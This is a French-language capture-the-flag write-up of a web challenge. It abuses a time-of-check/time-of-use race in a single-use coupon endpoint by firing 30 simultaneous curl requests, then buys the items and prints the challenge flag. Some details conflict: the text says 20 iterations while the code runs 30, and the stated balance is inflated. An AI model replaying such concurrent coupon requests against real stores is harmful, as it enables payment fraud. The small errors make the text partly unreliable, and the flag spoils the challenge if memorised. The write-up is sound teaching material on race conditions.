
**Catégorie :** Web

**Difficulté :** Medium

# Contexte

Vous êtes coincé dans une zone de quarantaine avec seulement **10€** en poche. Le magasin de survie local propose des équipements indispensables, mais les prix sont exorbitants : **50€** pour un kit de secours et **70€** pour des rations.

Une bannière affiche un code promo `STAYSAFE` donnant +10€, mais marqué _"une seule fois par personne"_.

# Reconnaissance

En lisant le code source, on pouvait observer une architecture claire :
- `POST /apply_coupon` : applique le code promo
- `POST /add_to_cart/kit` et `/add_to_cart/rations` : ajout au panier
- `POST /checkout` : finalise l'achat
- Un cookie `user_id` identifie chaque utilisateur côté serveur

# Identification de la Vulnérabilité

**Fonctionnement :**
1. Vérifier → "Ce coupon est-il déjà utilisé ?" → NON 
2. Créditer → +10€ sur le compte 
3. Marquer → coupon utilisé

**Raisonnement :** `"Le coupon est limité à une utilisation. La vérification se fait sûrement en deux temps : lecture puis écriture. Si j'envoie plein de requêtes en même temps, le serveur n'aura peut-être pas eu le temps de marquer le coupon comme utilisé entre les deux."`

Donc si on envoie plusieurs requêtes **simultanément**, elles passent toutes l'étape 1 avant qu'aucune n'ait écrit l'étape 3. C'est une [**Race Condition**](https://portswigger.net/web-security/race-conditions) (TOCTOU — Time Of Check To Time Of Use).

**Vulnérabilité :** [CVE-2026-31824](https://nvd.nist.gov/vuln/detail/CVE-2026-31824)

# Exploitation

**Etape 1 - Obtenir un user_id vierge**
```bash
curl -c cookies.txt http://185.98.136.226:30008/cart
```
On visite `/cart` sans cookie. Le serveur génère un nouveau `user_id` avec 10€ de solde. Le flag `-c cookies.txt` sauvegarde ce cookie dans un fichier pour la suite.

**Etape 2 - Race Condition**
```bash
for i in $(seq 1 30); do
	curl -b cookies.txt -X POST http://185.98.136.226:30008/apply_coupon \
    -d "coupon=STAYSAFE" &
done
wait
```

La boucle tourne 20 fois (pour être large). À chaque itération, curl envoie une requête POST avec notre cookie (`-b cookies.txt`) et le code promo (`-d "coupon=STAYSAFE"`). Le **`&`** à la fin de chaque curl est important: il envoie le processus en arrière-plan sans attendre sa fin donc les 30 requêtes partent **quasiment en même temps**. Le `wait` final bloque le script jusqu'à ce que tous les processus soient terminés.

**Résultat :** le serveur crédite +10€ plusieurs fois avant d'avoir pu marquer le coupon comme utilisé → solde ≫ 310€.

**Etape 3 - Acheter**
```bash
curl -b cookies.txt -X POST http://185.98.136.226:30008/add_to_cart/kit
curl -b cookies.txt -X POST http://185.98.136.226:30008/add_to_cart/rations
curl -b cookies.txt -X POST http://185.98.136.226:30008/checkout
```
On ajoute les deux articles au panier puis on valide le paiement. Le serveur voit un solde suffisant et retourne le flag.

**Etape 4 - Récupérer le flag !**
```bash
curl -L -b cookies.txt http://185.98.136.226:30008/cart
```
On récupère le flag.

**Flag : CTF{R4c3_C0nd1t1on_W4ll3t_H4ck_2026}**
